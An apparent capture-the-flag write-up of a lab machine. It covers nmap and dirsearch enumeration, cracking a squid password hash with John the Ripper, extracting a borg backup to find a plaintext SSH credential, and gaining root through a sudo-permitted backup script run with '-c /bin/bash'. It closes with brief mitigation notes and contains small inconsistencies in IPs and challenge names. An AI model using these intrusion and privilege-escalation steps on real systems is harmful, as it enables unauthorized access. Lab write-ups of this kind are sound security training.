### Cyborg CTF  Write-Up


 This repository contains a detailed write-up of the "Cyborg CTF" CTF challenge, including enumeration, exploitation, privilege escalation, and mitigation steps.

• CTF Name: Brute it          
• Difficulty Level: Easy     
• Ip address : 10.48.163.181


### Enumeration 

     • i started by scanning the ip to identify open ports and services through nmap :
    
           nmap -sV -O -sC 10.67.147.212

     • i found port 22 and 80 , on port 80 a web page was running
     • then i accessed the web page but there is nothing interesting
     • so, i decided to  perform directory Enumeration :
        
         sudo dirsearch -u http://10.48.163.181 -t 200


### Pre-Exploitation

    • i discovered a hidden admin panel : /admin  and /etc
    • in /etc directory i fouund squid folder in it i discovered the hash
    • then i decided to crack it using john the rapper:

         john hash.hash --wordlist=/path/path/rockyou.txt
     
    • cracked it successfully :squidword

    • then i went to /admin/admin.html 
    • here i found some usernames :Alex,josh,adam
    • and also i can download the archive.tar file 

    • then im tries to unzip and extract the information 

         tar -xvf archive.tar

    • then i unzip it and to extract it i installed borgbackup

         sudo apt instll borgbackup

         borg extract ./home/field/dev/final/archive::music_archive  ==> pass using the pre-cracked password (squidword)

    • after it, in the /home/alex/note.txt we can see the username and password of victem

          Alex:s3cretp@s3

    ### Exploitation

    • we have username and password so we can access the victem machine using ssh:

         ssh Alex@10.67.147.212 

    • i had successfully login to it and we can easily access the user.txt

         flag1{............}


### Privilege escalation


    • i need root access to get root.txt
    • i had checked that what alex can execute:
     
         sudo -l 

    • alex can run /etc/mp3backup/backup
    • so i tries to compramize the machine using this script :

         sudo /etc/mp3backup/backup.sh -c /bin/bash
    
    • i tries to extact it 

         id;whoami;cat root/root.txt
        
    • then exit to get the results

         exit    
    
    • now i see the 

         01 root flag{................} 



### Tools Used

      • Nmap

      • Dirsearch

      • John the Ripper

      • borgbackup

### Security Issues Identified

      • Unauthorized persons can access the admin pannel

      • admins usernames are visibly to public

      • Weak SSH key password

      • Easy to get sudo privileges

### Prevention Recommendations

   
      • make authorized persons can access admin pannel

      • alex user cam execute some root commands without root password

      • remove borgbackup file from downlads 

      • make a RSA key for SSH login

      
        

        


    

    
    
    


    
    


